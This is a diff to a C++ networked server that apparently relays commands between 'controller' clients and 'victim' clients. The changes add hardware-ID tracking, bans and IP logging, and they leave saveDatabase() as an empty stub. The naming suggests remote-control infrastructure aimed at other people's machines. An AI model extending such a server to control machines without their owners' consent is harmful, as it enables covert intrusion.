@@ -1,11 +1,23 @@
 #include "server.h"
+#include <iostream>
+#include <thread>
+#include <fstream>
 
 Server::Server()
 {
+	//create database file if it doesnt already exist
+	std::ifstream databaseFile(SERVER_FILES_PATH "/database.txt");
+	std::string line;
+	while (std::getline(databaseFile, line))
+		database[line.substr(0, line.find_first_of('-'))] = line.substr(line.find_first_of('-') + 1);
+	databaseFile.close();
+
 	//add new line in the log file
-	std::ofstream file(LOG_FILE, std::ios::app);
-	file << "\n";
-	file.close();
+	std::ofstream logs(SERVER_FILES_PATH "/logs.log", std::ios::app);
+	logs.seekp(0, std::ios::end);
+	if (logs.tellp() != 0)
+		logs << "\n";
+	logs.close();
 
 	//start listening to the port. if it fails, exit
 	if (listener.listen(SERVER_PORT) != sf::Socket::Done) {
@@ -52,7 +64,8 @@ void Server::receive()
 		}
 
 		//update time last message not mark as not-afk
-		c.second.lastMsg = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();
+		c.second.lastMsg = std::chrono::duration_cast<std::chrono::milliseconds>
+			(std::chrono::system_clock::now().time_since_epoch()).count();
 
 		//process the packet if it was received by a controller
 		if (c.second.role == 'c')
@@ -64,12 +77,13 @@ void Server::receive()
 		else if (c.second.role == '-') {
 			//get the client's role and name
 			sf::Uint8 wantedRole;
-			std::string rolePass;
-			p >> wantedRole >> rolePass;
+			p >> wantedRole;
 
 			//add new controller or victim to the list
 			if (wantedRole == 'c' || wantedRole == 'v') {
 				//version mis-match
+				std::string rolePass;
+				p >> rolePass;
 				if (rolePass != ((wantedRole == 'c') ? CONTROLLER_PASS : VICTIM_PASS)) {
 					p.clear();
 					p << sf::Uint8('<');
@@ -81,9 +95,27 @@ void Server::receive()
 
 				//retrieve hardware id
 				p >> c.second.hardwareId;
+				bool alreadySeenClient = database.count(c.second.hardwareId);
+				if (alreadySeenClient) {
+					char banStatus = database[c.second.hardwareId][0];
 
-				p.clear();
+					if (wantedRole == banStatus || banStatus == 'b') {
+						p.clear();
+						p << sf::Uint8('#');
+						c.second.socket->send(p);
+
+						//parse next message
+						continue;
+					}
+				}
+				//register the new client
+				else {
+					database[c.second.hardwareId] = "nno name";
+					saveDatabase();
+				}
+
 				//tell the client that it has been initialized
+				p.clear();
 				p << sf::Uint8(wantedRole);
 				//controllers need to know their id too
 				if (wantedRole == 'c')
@@ -93,7 +125,8 @@ void Server::receive()
 
 				auto ip = c.second.socket->getRemoteAddress().toString() + ":" + 
 					std::to_string(c.second.socket->getRemotePort());
-				writeLog(std::to_string(c.first) + " = new " + std::string(1, wantedRole) + " - " + ip);
+				writeLog(std::to_string(c.first) + " = " + std::string(1, wantedRole) + 
+					(alreadySeenClient ? " - " : " (new) - ") + ip + " - " + c.second.hardwareId);
 
 				updateControllersList();
 			}
@@ -279,7 +312,7 @@ void Server::processControllerMsg(sf::Uint16 id, sf::Packet p,
 		if (clients[oId].role == '-')
 			return;
 
-		clients[oId].name = name;
+		//clients[oId].name = name;
 
 		updateControllersList();
 	}
@@ -382,7 +415,8 @@ void Server::updateControllersList()
 		if (c.second.role == '-')
 			continue;
 
-		p << sf::Uint8(c.second.role) << c.first << c.second.pair << c.second.name << c.second.hardwareId;
+		std::string name = database[c.second.hardwareId].substr(1);
+		p << sf::Uint8(c.second.role) << c.first << c.second.pair << name << c.second.hardwareId;
 		p << c.second.socket->getRemoteAddress().toInteger() << c.second.socket->getRemotePort() << c.second.isAdmin;
 	}
 
@@ -397,11 +431,16 @@ void Server::updateControllersList()
 
 void Server::writeLog(std::string s)
 {
-	auto t = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();
+	auto t = std::chrono::duration_cast<std::chrono::seconds>
+		(std::chrono::system_clock::now().time_since_epoch()).count();
 
-	std::ofstream file(LOG_FILE, std::ios::app);
-	file << t << " - " << s << "\n";
-	file.close();
+	std::ofstream logs(SERVER_FILES_PATH "/logs.log", std::ios::app);
+	logs << t << ", " << s << "\n";
+	logs.close();
 
-	std::cout << t << " - " << s << "\n";
+	std::cout << t << ", " << s << "\n";
+}
+
+void Server::saveDatabase()
+{
 }
